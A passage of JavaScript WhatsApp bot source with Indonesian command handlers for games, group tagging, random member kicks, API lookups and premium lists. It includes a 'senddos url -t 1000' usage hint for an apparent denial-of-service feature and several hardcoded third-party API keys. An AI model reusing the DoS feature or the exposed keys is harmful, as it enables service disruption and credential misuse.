  } else if (nomorTanpaAwalan.startsWith('0852') || nomorTanpaAwalan.startsWith('0853') || nomorTanpaAwalan.startsWith('0851')) {
    provider = 'Telkomsel (Simpati)';
  } else if (nomorTanpaAwalan.startsWith('0881') || nomorTanpaAwalan.startsWith('0882') || nomorTanpaAwalan.startsWith('0883')) {
    provider = 'Smartfren';
  }

  m.reply(`Nomor ${nomorPonsel} berasal dari provider ${provider}.`);
  }
  break;

break;
  case 'tagall3':{
  if (!isPrem) return replyprem(mess.premium)
  if (!isAdmins) throw mess.admin
  if (!isGroup) throw mess.onlygroup;  
  const participants = await sky.groupMetadata(from);
  const participantList = participants.participants;
  
  for (const participant of participantList) {
    const contactId = participant.id;
    const contactName = participant.notify ? participant.notify : participant.id.split('@')[0];
    await sky.sendTextWithMentions(from, `Hai @${contactId.split('@')[0]}, Halo`);
    
    // Menunggu sejenak sebelum meng-tag peserta berikutnya
    await new Promise(resolve => setTimeout(resolve, 2000));
  }
  }
  break;
  case 'tag2by2': {
  if (!isPrem) return replyprem(mess.premium)
  if (!isGroup) throw mess.onlygroup;
  if (!args[0]) throw `Gunakan: *${prefix}tag2by2 [jumlah anggota yang ingin ditag]*`;

  const jumlahTag = parseInt(args[0]);
  if (isNaN(jumlahTag) || jumlahTag <= 0) throw 'Jumlah anggota yang ingin ditag harus berupa angka positif.';

  const participants = await sky.groupMetadata(from);
  const participantList = participants.participants;

  // Memastikan ada cukup anggota untuk dibagi dalam pasangan 2
  if (participantList.length < 2) {
    throw 'Tidak ada cukup anggota untuk membentuk pasangan.';
  }

  for (let i = 0; i < Math.min(jumlahTag, participantList.length); i += 2) {
    const participant1 = participantList[i];
    const participant2 = participantList[i + 1];

    const contactId1 = participant1.id;
    const contactId2 = participant2 ? participant2.id : '';

    const contactName1 = participant1.notify ? participant1.notify : participant1.id.split('@')[0];
    const contactName2 = participant2 ? (participant2.notify ? participant2.notify : participant2.id.split('@')[0]) : '';

    const tagMessage = `Hai @${contactId1.split('@')[0]} dan ${contactName2 ? ('@' + contactId2.split('@')[0]) : ''}, Sehat² Ya!`;

    await sky.sendTextWithMentions(from, tagMessage);

    // Menunggu sejenak sebelum meng-tag pasangan berikutnya
    await new Promise(resolve => setTimeout(resolve, 200));
  }
}
  break;
  case 'cekinfo':{
  const numberToCheck = parseInt(args[0]);

  if (isNaN(numberToCheck)) {
    await sky.sendText(from, 'Mohon masukkan angka yang valid.');
    return;
  }

  let info = `${numberToCheck} adalah `;
  
  if (numberToCheck % 2 === 0) {
    info += 'angka genap';
  } else {
    info += 'angka ganjil';
  }

  if (numberToCheck >= 0) {
    info += ', positif';
  } else {
    info += ', negatif';
  }

  if (numberToCheck === 0) {
    info += ', nol';
  }

  await sky.sendText(from, info);
  }
  break;

  //GAME KY
case 'gamehantu': {
  gameInProgress = true;
  playerAlive = true;
m.reply('Game Made By Avosky')
  await sky.sendText(from, 'Anda sedang berada di dalam rumah yang gelap. Apakah Anda ingin berjalan ke kiri atau kanan? (ketik "kiri" atau "kanan")');
}
break;

// Case untuk menjawab pilihan dalam game
case 'kiri': {
  if (!gameInProgress) {
    await sky.sendText(from, 'Game belum dimulai.');
    return;
  }

  if (!playerAlive) {
    await sky.sendText(from, 'Anda sudah mati. Ketik "gamehantu" untuk memulai lagi.');
    return;
  }

  const randomNumber = Math.random();

  if (randomNumber < 0.5) {
    await sky.sendText(from, 'Anda menemukan pintu keluar! Anda berhasil meloloskan diri dari rumah yang angker. Game selesai.');
    gameInProgress = false;
  } else {
    await sky.sendText(from, 'Anda melihat sosok hantu di sudut ruangan. Anda mati. Ketik "startgame" untuk memulai lagi.');
    playerAlive = false;
  }
}
break;

// Case untuk menjawab pilihan dalam game dan mereply dengan informasi pengirim asli
case 'kanan': {
  if (!gameInProgress) {
    await sky.sendText(from, 'Game belum dimulai.');
    return;
  }

  if (!playerAlive) {
    await sky.sendText(from, 'Anda sudah mati. Ketik "gamehantu" untuk memulai lagi.');
    return;
  }

  await sky.sendText(from, 'Anda berjalan ke kanan dan menemukan pintu yang terkunci. Cobalah arah lain.');
}
break;



case 'tepukgame':{
  if (isGameActive) {
    await sky.sendText(from, 'Permainan yang melibatkan tepuk tangan sudah sedang berlangsung.');
    return;
  }
m.reply('Game Made By Avosky')
  isGameActive = true;
  requiredClaps = Math.floor(Math.random() * 10) + 1;
  totalClaps = 0;

  await sky.sendText(from, `Hai ${pushname} Permainan Tepuk Tangan dimulai! Lakukan tepuk tangan sebanyak ${requiredClaps} kali. Balas dengan "tepuk" untuk melanjutkan.`);
  }
  break;

case 'tepuk':{
  if (!isGameActive) {
    await sky.sendText(from, 'Tidak ada permainan yang sedang berlangsung.');
    return;
  }

  totalClaps++;

  if (totalClaps === requiredClaps) {
    isGameActive = false;
    await sky.sendText(from, 'Selamat! Anda berhasil menyelesaikan permainan Tepuk Tangan.');
  } else {
    await sky.sendText(from, `Tepuk tangan ke-${totalClaps}! Tepuk lagi untuk melanjutkan.`);
  }
  }
  break;

case 'tebakmulai':{
  if (!isGroup) throw mess.onlygroup;
  if (isGameActive) throw 'Permainan sudah sedang berlangsung.';
m.reply('Game Made By Avosky')
  const words = ['apel', 'pisang', 'jeruk', 'mangga', 'semangka', 'anggur'];
  secretWord = words[Math.floor(Math.random() * words.length)];
  isGameActive = true;

  await sky.sendText(from, `Permainan Tebak Apa yang Dipikirkan dimulai!\nSilakan tebak kata yang saya pikirkan.\n\nWord\n> 'apel', 'pisang', 'jeruk', 'mangga', 'semangka', 'anggur'\n\nContoh Tebakk mangga`);
  }
  break;

case 'tebakk':{
  if (!secretWord) throw 'Kata yang harus ditebak belum ditentukan.';

  const userGuess = args[0].toLowerCase();
  
  if (userGuess === secretWord) {
    await sky.sendText(from, `Selamat, tebakan kamu benar  ${pushname}`);
  } else {
    await sky.sendText(from, `Maaf, tebakan kamu salah. Coba lagi ${pushname}`);
  }
 } 
  break;
case 'definisi': {
    const axios = require('axios');

    if (!text) {
        return m.reply(`Provide a word to get its definition.\n\nExample: ${prefix + command} computer`);
    }

    axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`)
        .then(response => {
            const meanings = response.data[0].meanings;
            if (meanings && meanings.length > 0) {
                const definition = meanings[0].definitions[0].definition;
                m.reply(`Definition of "${text}": ${definition}`);
            } else {
                m.reply(`No definition found for "${text}".`);
            }
        })
        .catch(error => {
            m.reply('Failed to fetch the definition. Please try again later.');
        });
}
break;
case 'konversi': {
    const axios = require('axios');
    if (!text) {
        return m.reply('Harap berikan parameter yang benar untuk konversi mata uang.\n\nContoh: !konversi 100 USD | EUR');
    }
    const parts = text.split(' ');
    if (parts.length !== 4 || parts[2].toLowerCase() !== '|') {
        return m.reply('Format konversi mata uang tidak valid.\n\nContoh yang benar: !konversi-mata-uang 100 USD | EUR');
    }
    const amount = parseFloat(parts[0]);
    const fromCurrency = parts[1].toUpperCase();
    const toCurrency = parts[3].toUpperCase();
    axios.get(`https://api.exchangerate-api.com/v4/latest/${fromCurrency}`)
        .then(response => {
            const exchangeRates = response.data.rates;
            if (exchangeRates[toCurrency]) {
                const convertedAmount = amount * exchangeRates[toCurrency];
                m.reply(`${amount} ${fromCurrency} setara dengan ${convertedAmount} ${toCurrency}`);
            } else {
                m.reply('Mata uang tujuan tidak valid atau tidak ditemukan dalam data pertukaran.');
            }
        })
        .catch(error => {
            m.reply('Jika Hasil Tidak Keluar Coba Lagi');
        });
}
break;
case 'teknologi': {
    axios.get('https://newsapi.org/v2/top-headlines?country=id&category=technology&apiKey=a6d8b9447c56493a8b7f2388144d4c8d')
        .then(response => {
            const articles = response.data.articles;
            if (articles && articles.length > 0) {
                const firstArticle = articles[0];
                m.reply(`Berita teknologi terkini:\nJudul: ${firstArticle.title}\nSumber: ${firstArticle.source.name}\nTautan: ${firstArticle.url}`);
            } else {
                m.reply('Tidak ada berita teknologi terkini yang ditemukan.');
            }
        })
        .catch(error => {
            m.reply('Terjadi kesalahan saat mengambil berita terkini. Silakan coba lagi nanti.');
        });
}
        break    
case 'berita': {
 if (!text) throw `Country Id Nya mana? Contoh\nBerita ID Untuk Indonesia\nWork All Country`
    axios.get(`https://newsapi.org/v2/top-headlines?country=${text}&apiKey=a6d8b9447c56493a8b7f2388144d4c8d`)
        .then(response => {
            const articles = response.data.articles;
            if (articles && articles.length > 0) {
                const firstArticle = articles[0];
                m.reply(`Berita terkini:\nJudul: ${firstArticle.title}\n\nSumber: ${firstArticle.source.name}\nTautan: ${firstArticle.url}`);
            } else {
                m.reply('Tidak ada berita terkini yang ditemukan.');
            }
        })
        .catch(error => {
            m.reply('Terjadi kesalahan saat mengambil berita terkini. Silakan coba lagi nanti.');
        });
}
break;
case 'infomovie': {
    const axios = require('axios');

    if (!text) {
        return m.reply(`Provide the title of a movie to get its information.\n\nExample: ${prefix + command} Inception`);
    }

    const movieTitle = encodeURIComponent(text);

    axios.get(`https://www.omdbapi.com/?apikey=ebf251e0&t=${movieTitle}`)
        .then(response => {
            const movieData = response.data;
            if (movieData.Response === 'True') {
                const info = `Title: ${movieData.Title}\nYear: ${movieData.Year}\nGenre: ${movieData.Genre}\nDirector: ${movieData.Director}\nIMDb Rating: ${movieData.imdbRating}\n\nPreview Image :\n>${movieData.Poster}`;
                m.reply(info);
            } else {
                m.reply(`No information found for "${text}".`);
            }
        })
        .catch(error => {
            m.reply('Failed to fetch movie information. Please try again later.');
        });
}
break;
  case 'jokequote': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    axios.get('https://icanhazdadjoke.com/')
        .then(response => {
            const $ = cheerio.load(response.data);
            const joke = $('p').text();
            m.reply(joke);
        })
        .catch(error => {
            m.reply('Failed to fetch a dad joke. Please try again later.');
        });
}
break;
case 'tebakakhiri':{
  isGameActive = false;
  secretWord = null;
  
  await sky.sendText(from, 'Permainan Tebak Apa yang Dipikirkan telah diakhiri.');
  }
  break;
case 'ero': case 'ero': {
           if (!isPrem) return replyprem(mess.premium)
			m.reply(mess.wait)
			sky.sendMessage(m.chat, { image: { url: `https://api.zahwazein.xyz/randomanime/${command}?apikey=zenzkey_94e9997864a8` }, caption: `Type: ${command}`})
			}
			break

case 'impostormulai':{
  if (!isGroup) throw mess.onlygroup;
  if (isGameActive) throw 'Permainan sudah sedang berlangsung.';
  if (!isAdmins) throw 'Anda harus menjadi admin grup untuk memulai permainan.';
m.reply('Game Made By Avosky')
  players = []; // Reset daftar pemain
  const groupParticipants = await sky.groupMetadata(from);
  for (const participant of groupParticipants.participants) {
    players.push(participant.id);
  }
  
impostorId = players[Math.floor(Math.random() * players.length)];

  await sky.sendText(from, `Permainan Mencari Impostor dimulai!\nSiapa di antara kamu adalah Impostor?`);
  }
  break;

// Sisanya tetap sama seperti sebelumnya

case 'impostorcek':{
  if (!players) throw 'Permainan belum dimulai atau telah berakhir.';
  if (impostorId === null) throw 'Impostor belum ditentukan.';

  const senderId = m.sender;
  if (players.includes(senderId)) {
    if (senderId === impostorId) {
      await sky.sendText(from, `Kamu adalah Impostor  ${pushname}`);
    } else {
      await sky.sendText(from, `Kamu bukan Impostor  ${pushname}`);
    }
  } else {
    throw 'Kamu tidak terdaftar dalam permainan.';
  }
  }
  break;
case 'impostorakhiri':{
  isGameActive = false;
  players = null; // Reset daftar pemain
  await sky.sendText(from, 'Permainan Mencari Impostor telah diakhiri.');
  }
  break;
case 'tebakangka':
  const angkaTebak = Math.floor(Math.random() * 100) + 1; // Angka acak antara 1 dan 100
  let tebakanPengguna = parseInt(args[0]);

  if (isNaN(tebakanPengguna)) {
    m.reply('Silakan masukkan angka sebagai tebakan.');
    return;
  }

  if (tebakanPengguna === angkaTebak) {
    m.reply('Selamat, tebakan Anda benar!');
  } else if (tebakanPengguna < angkaTebak) {
    m.reply('Tebakan Anda terlalu rendah. Coba lagi.');
  } else {
    m.reply('Tebakan Anda terlalu tinggi. Coba lagi.');
  }
  break;
  case 'senddos':{
  m.reply('contoh senddos url -t 1000')
  }
  break
case 'kickrandom':{
  if (!isAdmins) throw mess.admin
  if (!isGroup) throw mess.onlygroup;
  if (!args[0]) throw `Gunakan: *${prefix}kickrandom [jumlah anggota yang ingin di-kick]*`;

  const jumlahKick = parseInt(args[0]);
  if (isNaN(jumlahKick) || jumlahKick <= 0) throw 'Jumlah anggota yang ingin di-kick harus berupa angka positif.';

  const participants = await sky.groupMetadata(from);
  const participantList = participants.participants;

  for (let i = 0; i < Math.min(jumlahKick, participantList.length); i++) {
    const randomIndex = Math.floor(Math.random() * participantList.length);
    const participant = participantList[randomIndex];

    if (!participant.isAdmin) {
      const users = [participant.id];
      const result = await sky.groupParticipantsUpdate(m.chat, users, 'remove');
      
      await new Promise(resolve => setTimeout(resolve, 1000)); // Jeda sebelum meng-kick anggota berikutnya
    }
  }

  m.reply(`Berhasil meng-kick ${Math.min(jumlahKick, participantList.length)} anggota secara random.`);
  }
  break;

case 'checkme':
					neme = args.join(" ")
					bet = `Tes`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
sky.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
//=================================================//
case 'addprem':
if (!isCreator) throw mess.owner
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await sky.onWhatsApp(prrkek)
if (ceknya.length == 0) return m.reply(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
m.reply(`The Number ${prrkek} Has Been Premium!`)
break
case 'listpremium': {
    const fs = require('fs');
    const path = './database/premium.json';

    // Cek apakah file premium.json ada
    if (fs.existsSync(path)) {
        // Baca file dan parsing ke JSON
        const premiumData = JSON.parse(fs.readFileSync(path));

        // Cek apakah ada data di premium.json
        if (premiumData && premiumData.length > 0) {
            let message = 'Daftar nomor premium:\n\n';
            
            // Looping melalui data premium
            premiumData.forEach((user, index) => {
                message += `${index + 1}. ${user}\n`;
            });

            m.reply(message);
        } else {
            m.reply('Belum ada nomor premium yang terdaftar.');
        }
    } else {
        m.reply('File database premium tidak ditemukan.');
    }
}
break;
case 'pengguna':  {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!args[0]) return m.reply(`*Contoh : ${command} add 6281214281312*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return m.reply('*Pengguna Ini telah Di Ban*')
banned.push(orgnye)
m.reply(`Succes ban Pengguna Ini`)
} else if (args[0] === "del") {
if (!isBane) return m.reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
m.reply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
} else {
m.reply("Error")
}
}
break
//=================================================//
case 'listban':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 teksooop = `*List Ban*\n\n`
for (let ii of banned) {
teksooop += `- ${ii}\n`
}
m.reply(teksooop)
break
		                
case 'ttsnime':{ 
try {
texts = text.split('|')[0] ? text.split('|')[0] : '-'
voice = text.split('|')[1] ? text.split('|')[1] : '-'
if (!text) return m.reply(`Example : ${prefix + command} haiiii|voicenya\n\nuntuk melihat voice ketik listnime`)
m.reply(mess.wait)
let tts = await fetchJson(`http://skizo.tech/api/tts-anime?&text=${texts}&lang=mix&voice=${voice}&speed=0.65&apikey=skuy33`)
sky.sendMessage(m.chat, { audio: { url: tts.data.url }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
}
break
case 'toanime2': {
 if (!isPrem) return replyprem(mess.premium)
                    if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                    if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                    if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                    m.reply(mess.wait)
	const media = await sky.downloadAndSaveMediaMessage(quoted)
	const { TelegraPh } = require('./lib/uploader')
	const anu = await TelegraPh(media)
	let { data } = await axios.get(`https://skizo.tech/api/mirror?apikey=sky33&url=${anu}&filter=starry_girl`)
	if (data.message) return m.reply(JSON.stringify(data))
	await sky.sendMessage(m.chat, { image: { url: data.generated_image_addresses[0] }, caption: mess.done }, { quoted: m }).catch ((err) => m.reply(mess.error))
}
break
case 'aiedit': {
 if (!isPrem) return replyprem(mess.premium)
                    if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command} ( it's up to you what you want to edit it into )`)
                    if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command} ( it's up to you what you want to edit it into )`)
                    if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command} ( it's up to you what you want to edit it into )`)
                    m.reply(mess.wait)
	const media = await sky.downloadAndSaveMediaMessage(quoted)
	const { TelegraPh } = require('./lib/uploader')
	const anu = await TelegraPh(media)
	await 
      sky.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/image-editor?url=${anu}&text=${text}&apikey=${apikey}` }, caption: mess.done }, { quoted: m})
}
break                
		                case 'zodiak': case 'zodiac': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
		    case 'darkjoke': case 'memeindo': case 'randommeme': {
m.reply(mess.wait);
 pinterest(command.toLowerCase())
 .then((result) => {
 if (result.status === 200 && result.result.length > 0) {
 let imageUrl = result.result[Math.floor(Math.random() * result.result.length)];
 sky.sendMessage(m.chat, { image: { url: imageUrl }, caption: mess.done }, { quoted: m });
 } else {
 m.reply('Tidak dapat menemukan gambar untuk karakter ini.');
 }
 })
 .catch((error) => {
 console.error(error);
 m.reply('Terjadi kesalahan dalam mencari gambar.');
 });
}
break

			        						
            case 'shio': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
            }
            break
            case 'ttstalk': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
			if (args1.length == 0) return m.reply(`Example: ${prefix + command} dryan.pu`)
			m.reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=Gata_Dios`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Nickname : ${data.result.nickname}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Followings : ${data.result.followings}\n`
				caption += `Likes : ${data.result.likes}\n`
				caption += `Video : ${data.result.video}\n`
				caption += `Bio : ${data.result.bio}\n`
				sky.sendMessage(m.chat, { image: { url: data.result.user_picture }, caption })
			})
			
			}
			break
			case 'toviewonce': { 
if (!quoted) return m.reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await sky.downloadAndSaveMediaMessage(quoted)
sky.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await sky.downloadAndSaveMediaMessage(quoted)
sky.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
			case 'mlstalk': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
			if (args1.length == 0) return m.reply(`Example: ${prefix + command} 84830127/2169`)
			m.reply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args[0]}?apikey=Gata_Dios`)
			m.reply(data.result)
			
			}
			break
			
			case 'ghstalk': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
			if (args1.length == 0) return m.reply(`Example: ${prefix + command} Yori Hosting`)
			m.reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/github/${args[0]}?apikey=Gata_Dios`).then(({ data }) => {
				var caption = `Name : ${data.result.name}\n`
				caption += `Link : ${data.result.url}\n`
				caption += `Public Repo : ${data.result.public_repos}\n`
				caption += `Public Gists : ${data.result.public_gists}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				sky.sendMessage(m.chat, { image: { url: data.result.avatar }, caption })
			})
			
			}
			break
		                		   
					case 'jarak': {
		let [from, to] = text.split`|`
	if (!(from && to)) throw `jarak jakarta|bandung`
	var data = await jarak(from, to)
	if (data.img) return sky.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else m.reply(data.desc)
}
break
case 'kalahkanmonster': {
    const namaMonster = ['raksasa', 'naga', 'setan', 'vampir', 'serigala', 'zombie', 'golem', 'harpy', 'ular besar'];
    const pilihan = args[0]?.toLowerCase();

    if (!pilihan) {
        return await m.reply(`Pilihan monster yang tersedia: ${namaMonster.join(', ')}`);
    }
    if (!namaMonster.includes(pilihan)) {
        return await m.reply('Pilihan monster tidak valid. Pilihan yang tersedia: ' + namaMonster.join(', '));
    }

    const lawanPilihan = namaMonster[Math.floor(Math.random() * namaMonster.length)];

    let userScore = 0;
    let lawanScore = 0;
    let maxRounds = 10; // Jumlah ronde maksimal
    let round = 1;
    let result = `⚔️ Mulai permainan mengalahkan ${pilihan} dengan monster ${lawanPilihan} ⚔️\n\n`;

    while (round <= maxRounds) {
        let userAction = Math.random() < 0.5 ? 'serang' : 'bertahan';
        let lawanAction = Math.random() < 0.5 ? 'serang' : 'bertahan';

        if (userAction === 'serang' && lawanAction === 'bertahan') {
            userScore++;
            result += `🤜 Anda menyerang dan berhasil mengalahkan taktik bertahan ${lawanPilihan}! (+1 poin)\n`;
        } else if (userAction === 'bertahan' && lawanAction === 'serang') {
            lawanScore++;
            result += `🤜 ${lawanPilihan} menyerang dan Anda berhasil bertahan! (+1 poin)\n`;
        } else {
            result += `🤝 Kedua belah pihak sama-sama menerapkan taktik yang sama.\n`;
        }

        // Variasi aksi tambahan
        if (userAction === 'serang' && lawanAction === 'serang') {
            result += `🔥 Serangan Anda dan ${lawanPilihan} bertabrakan, menghasilkan ledakan! Kedua pihak mendapatkan poin.\n`;
            userScore++;
            lawanScore++;
        } else if (userAction === 'bertahan' && lawanAction === 'bertahan') {
            result += `🛡️ Kedua belah pihak memilih bertahan, tidak ada yang mendapatkan poin.\n`;
        } else {
            result += `🌀 ${pilihan === 'serang' ? 'Anda menyerang' : 'Anda bertahan'} dan ${lawanPilihan === 'serang' ? lawanPilihan + ' menyerang' : lawanPilihan + ' bertahan'}.\n`;
        }

        round++;
    }

    result += `\n⏱️ Pertandingan selesai! Skor akhir: Anda ${userScore} - ${lawanPilihan} ${lawanScore}`;

    if (userScore > lawanScore) {
        result += `\n🎉 Anda berhasil mengalahkan ${lawanPilihan} dengan skor ${userScore}-${lawanScore}!`;
    } else if (lawanScore > userScore) {
        result += `\n😢 Anda kalah melawan ${lawanPilihan} dengan skor ${userScore}-${lawanScore}!`;
    } else {
        result += `\n⚖️ Pertandingan melawan ${lawanPilihan} berakhir imbang dengan skor ${userScore}-${lawanScore}!`;
    }

    await m.reply(`${result}`);
}
break;
